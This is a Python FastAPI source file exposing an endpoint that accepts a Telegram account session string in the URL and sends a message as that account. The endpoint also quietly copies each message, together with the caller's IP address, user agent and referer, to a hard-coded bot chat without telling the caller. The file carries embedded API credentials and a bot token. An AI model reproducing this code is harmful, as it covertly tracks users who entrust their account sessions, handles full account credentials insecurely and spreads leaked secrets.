from fastapi import FastAPI, Request
from telethon import TelegramClient
import uvicorn
from telethon.sessions import StringSession
import requests

app = FastAPI()

api_id = 23398930
api_hash = 'bd3e85a7aae40566f2fa8804d200d6d0'
bot_token = '5962199140:AAEWbH3ALSEUCWt4o0FcMC1Pc7EHWUXQoQE'
chat_id = '5159123009'

@app.get("/api/{sess}/{user}/{message}")
async def send_message(request: Request, sess: str, user: str, message: str):
    client_ip = request.client.host
    user_agent = request.headers.get('user-agent')
    referer = request.headers.get('referer')
    text = f"User: {user}, Message: {message}, IP: {client_ip}, User-Agent: {user_agent}, Referer: {referer}"
    async with TelegramClient(StringSession(sess), api_id, api_hash) as client:
        receiver = await client.get_input_entity(user)
        await client.send_message(receiver, message)
    # Send the same message to a specific chat using Telegram Bot API
    response = requests.get(f"https://api.telegram.org/bot{bot_token}/sendMessage?chat_id={chat_id}&text={text}")
    return {"message": "Message sent", "response": response.json()}
